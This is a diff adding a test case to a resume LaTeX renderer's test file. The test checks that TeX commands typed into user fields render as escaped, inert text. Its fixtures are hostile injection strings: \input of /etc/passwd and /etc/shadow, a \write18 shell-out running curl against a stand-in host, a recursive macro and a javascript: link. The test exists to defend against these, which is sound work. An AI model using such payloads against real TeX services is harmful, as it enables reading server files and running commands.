@@ -79,6 +79,42 @@ function run() {
   const emptyOptional = renderResumeLatex({ ...fixture, certifications: [], awards: [] });
   assert.ok(!emptyOptional.includes('\\section{Certifications}'), 'empty certs -> no section');
 
+  // (e) TeX commands in user text stay inert.
+  //
+  // /api/compile no longer accepts LaTeX from anyone — it renders from a stored
+  // structure — so these strings can only arrive as someone's job title or
+  // bullet. They must land as printable characters, never as commands: \input
+  // reads a server file into the PDF, \write18 shells out, and a self-calling
+  // macro runs until the compile times out.
+  const hostile = renderResumeLatex({
+    ...fixture,
+    name: '\\input{/etc/passwd}',
+    summary: '\\immediate\\write18{curl evil.example}',
+    experience: [
+      {
+        title: '\\def\\x{\\x}\\x',
+        dates: '2024',
+        org: '\\catcode`\\@=11',
+        location: '\\href{javascript:alert(1)}{click}',
+        bullets: ['\\input{/etc/shadow}'],
+      },
+    ],
+  });
+  // Comments are stripped first: TeX ignores everything after an unescaped %,
+  // and the preamble carries a comment mentioning \input that would otherwise
+  // look like a hit.
+  const live = hostile.replace(/(^|[^\\])%.*$/gm, '$1');
+  for (const command of ['\\input{', '\\write18', '\\def\\x', '\\catcode', '\\href{javascript:']) {
+    assert.ok(
+      !live.includes(command),
+      `user text produced a live TeX command: ${command}`,
+    );
+  }
+  // It is still printed, just as text — the backslash became \textbackslash and
+  // the braces were escaped, so nothing is silently dropped from the resume.
+  assert.ok(hostile.includes('\\textbackslash'), 'hostile input should render as visible text');
+  assert.ok(hostile.includes('\\{'), 'braces in user text must be escaped');
+
   console.log('latexEngine.test.ts: all assertions passed');
 }
 
